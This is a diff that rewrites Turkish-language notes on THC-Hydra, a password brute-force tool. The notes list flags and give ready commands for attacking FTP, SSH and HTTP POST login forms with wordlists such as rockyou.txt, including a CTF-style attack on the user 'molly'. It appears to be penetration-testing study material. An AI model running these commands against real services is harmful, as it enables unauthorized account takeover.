@@ -1,94 +1,123 @@
-# Hydra ile Parola Kırma (Brute Force)
+# Hydra ile Çevrim İçi Parola Kırma (Brute-Force / Sözlük Saldırısı)
 
-**Hydra Kurulumu**
+## 1. Hydra Nedir ve Kurulumu
 
-Resmi depolardan veya dağıtım paket yöneticileriyle kurulabilir:
+THC-Hydra; ağ servislerine (SSH, FTP, HTTP/HTTPS, SMB vb.) karşı son derece hızlı çevrim içi (online) kaba kuvvet (**Brute-Force**) ve sözlük (**Dictionary Attack**) saldırıları gerçekleştiren paralel oturum destekli bir penetrasyon testi aracıdır.
 
-- **Ubuntu/Debian:** `sudo apt install hydra`
+### Kurulum Komutları:
+
+- **Debian / Ubuntu / Kali Linux:**
     
-- **Fedora:** `sudo dnf install hydra`
+    Bash
+    
+    ```
+    sudo apt update && sudo apt install hydra -y
+    ```
+    
+- **Fedora / RHEL:**
+    
+    Bash
+    
+    ```
+    sudo dnf install hydra -y
+    ```
+    
+- **Arch Linux:**
+    
+    Bash
+    
+    ```
+    sudo pacman -S hydra
+    ```
     
 
-## 1. Temel Kullanım ve Parametreler
-
-Hydra komutları hedef servise (protokole) göre değişiklik gösterir.
+## 2. Temel Komut Parametreleri (Flags)
 
 |**Parametre**|**Açıklama**|
 |---|---|
-|`-l <kullanıcı>`|Tek bir hedef kullanıcı adı belirler (küçük 'l').|
-|`-L <dosya_yolu>`|Kullanıcı adı listesi (wordlist) kullanır.|
-|`-p <parola>`|Tek bir parola dener.|
-|`-P <dosya_yolu>`|Parola listesi (wordlist) kullanır (büyük 'P').|
-|`-t <sayı>`|Paralel çalışacak iş parçacığı (thread) sayısı (Örn: `-t 4`).|
-|`-s <port>`|Hedef varsayılan dışı bir port kullanıyorsa port numarasını belirtir.|
-|`-V` / `-vV`|Verbose modu: Her denemeyi ekranda gösterir.|
+|**`-l <kullanıcı>`**|Tek bir hedef kullanıcı adı belirler _(küçük 'l')_.|
+|**`-L <dosya_yolu>`**|Kullanıcı adlarını bir wordlist dosyasından okur _(büyük 'L')_.|
+|**`-p <parola>`**|Tek bir sabit parola dener _(küçük 'p')_.|
+|**`-P <dosya_yolu>`**|Parolaları bir wordlist dosyasından (`rockyou.txt` vb.) dener _(büyük 'P')_.|
+|**`-t <sayı>`**|Aynı anda çalışacak iş parçacığı (**thread**) sayısını belirler _(Örn: `-t 4`)_.|
+|**`-s <port>`**|Servis varsayılan dışı bir portta çalışıyorsa portu belirtir _(Örn: `-s 8080`)_.|
+|**`-V` / `-vV`**|Ayrıntılı mod (**Verbose**): Yapılan her parola denemesini anlık ekrana basar.|
+|**`-f`**|İlk geçerli parola eşleşmesi bulunduğunda saldırıyı otomatik durdurur.|
+|**`-o cikti.txt`**|Bulunan kimlik bilgilerini bir metin dosyasına kaydeder.|
 
-## 2. Protokol Bazlı Örnekler
+## 3. Protokol Bazlı Temel Örnekler
 
-### FTP Brute Force
-
-Bash
-
-```
-hydra -l user -P passlist.txt ftp://HEDEF_IP
-```
-
-### SSH Brute Force
+### A) FTP Parola Kırma (Port 21)
 
 Bash
 
 ```
-hydra -l root -P /path/to/passwords.txt HEDEF_IP -t 4 ssh
+hydra -l user -P passlist.txt ftp://192.168.1.50
 ```
 
-- **Kullanıcı Adı:** `root`
-    
-- **Parola Listesi:** `passwords.txt`
-    
-- **Eşzamanlı İstek:** `-t 4` (4 paralel thread)
-    
+### B) SSH Parola Kırma (Port 22)
 
-## 3. Web Formları (HTTP POST Form)
-
-Web formlarına saldırırken isteğin türü (GET/POST), form parametreleri ve hatalı giriş mesajı analiz edilmelidir (Tarayıcı Geliştirici Araçları $\rightarrow$ Network sekmesi).
-
-### Genel Sözdizimi
+SSH servisleri sık bağlantılarda IP kilitlemesi yapabileceği için thread sayısını (`-t 4`) düşük tutmak bağlantının düşmesini önler:
 
 Bash
 
 ```
-hydra -l <kullanıcı> -P <wordlist> HEDEF_IP http-post-form "<dizin>:<gövde_verisi>:<hata_mesajı>" -V
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.50 -t 4 ssh
 ```
 
-### Parametre Formatı Detayı
+## 4. Web Formlarına Yönelik Saldırılar (`http-post-form`)
 
-`"<path>:<login_credentials>:<invalid_response>"`
+Web arayüzlerindeki oturum formlarına brute-force yaparken istek türü, form alanları ve sunucunun başarısız girişte döndürdüğü hata mesajı analiz edilmelidir (_Tarayıcı Geliştirici Araçları $\rightarrow$ Network / Ağ sekmesi_).
 
-- **Path (`<dizin>`):** Formun bulunduğu URL/dizin (Örn: `/` veya `/login.php`).
-    
-- **Credentials (`<gövde_verisi>`):** Formdaki alan isimleri. Hydra değişkenleri `^USER^` ve `^PASS^` ile eşlenir (Örn: `username=^USER^&password=^PASS^`).
-    
-- **Invalid Response (`<hata_mesajı>`):** Giriş başarısız olduğunda sunucunun döndürdüğü hata metni. Başına `F=` eklenir (Örn: `F=incorrect` veya `F=Invalid username or password`).
-    
-
-### Örnek Komutlar
-
-Standart port üzerinden POST formu:
+### Genel Sözdizimi:
 
 Bash
 
 ```
-hydra -l admin -P wordlist.txt HEDEF_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+hydra -l <kullanıcı> -P <wordlist> <HEDEF_IP> http-post-form "<dizin>:<gövde_verisi>:<hata_koşulu>" -V
 ```
 
-Özel (farklı) bir port üzerinden POST formu:
+### Parametre Formatının İncelenmesi:
 
-Bash
+Plaintext
 
 ```
-hydra -l admin -P wordlist.txt HEDEF_IP http-post-form "/login:user=^USER^&pass=^PASS^:F=Failed" -s 8080 -V
+"<path>:<login_credentials>:<invalid_response>"
+   │              │                     │
+   │              │                     └─► Hatalı girişte dönen metin (Örn: F=incorrect)
+   │              └─► Form alan isimleri ve değişkenler (user=^USER^&pass=^PASS^)
+   └─► Formun bulunduğu URL/dizin (Örn: /login.php)
 ```
 
-└──╼ $hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.112.141.63 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+- **Dizin (`<path>`):** Formun gönderildiği uç nokta (`/` veya `/login.php`).
+    
+- **Gövde Verisi (`<login_credentials>`):** Formdaki `name` alanları. Kullanıcı adı değişkeni `^USER^`, parola değişkeni `^PASS^` ile tanımlanır.
+    
+- **Hata Koşulu (`<invalid_response>`):** Giriş reddedildiğinde sayfada çıkan metin. Başına **`F=`** (_Failure_) eklenir _(Örn: `F=incorrect`, `F=Invalid credentials`)_.
+    
 
-hydra -l molly -P /usr/share/wordlists/rockyou.txt MACHINE_IP -t 4 ssh
+### Örnek Web Form Komutları:
+
+- **Standart Portta (Port 80) Web Giriş Formu:**
+    
+    Bash
+    
+    ```
+    hydra -l admin -P wordlist.txt 10.10.10.50 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+    ```
+    
+- **Özel Portta (Örn: Port 8080) Çalışan Form:**
+    
+    Bash
+    
+    ```
+    hydra -l admin -P wordlist.txt 10.10.10.50 http-post-form "/login:user=^USER^&pass=^PASS^:F=Failed" -s 8080 -V
+    ```
+    
+- **Gerçek CTF Senaryosu (Molly kullanıcısı için `rockyou.txt` denemesi):**
+    
+    Bash
+    
+    ```
+    hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.112.141.63 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+    ```
